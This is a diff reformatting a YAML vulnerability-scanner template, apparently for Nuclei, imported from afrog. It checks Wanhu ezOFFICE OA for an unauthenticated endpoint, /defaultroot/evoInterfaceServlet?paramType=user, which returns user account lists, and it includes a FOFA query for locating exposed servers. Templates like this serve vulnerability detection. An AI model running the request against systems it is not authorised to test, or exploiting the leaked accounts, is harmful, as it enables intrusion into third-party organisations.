@@ -1,28 +1,30 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: wanhu-evointerfaceservlet-unauth
+
+info:
+  name: 万户 ezOFFICE evoInterfaceServlet 未授权账户信息泄露
+  author: zan8in
+  severity: high
+  description: |
+    万户 OA /defaultroot/evoInterfaceServlet?paramType=user 未授权返回 userList 等账户数据，可用于后续登录与横向。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,ezoffice,unauth,disclosure
+
 http:
-  - matchers:
-      - type: status
-        status:
-          - 200
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/evoInterfaceServlet?paramType=user"
+    matchers-condition: and
+    matchers:
       - type: word
         part: body
         words:
-          - 'result:'
-          - 'data:'
+          - "result:"
+          - "data:"
           - '"userList":'
         condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}/defaultroot/evoInterfaceServlet?paramType=user'
-id: wanhu-evointerfaceservlet-unauth
-info:
-  author: zan8in
-  description: ""
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 万户 OA 未授权访问获取所有账户密码
-  severity: high
-  tags: wanhu,unauth,argus-import
+      - type: status
+        status:
+          - 200
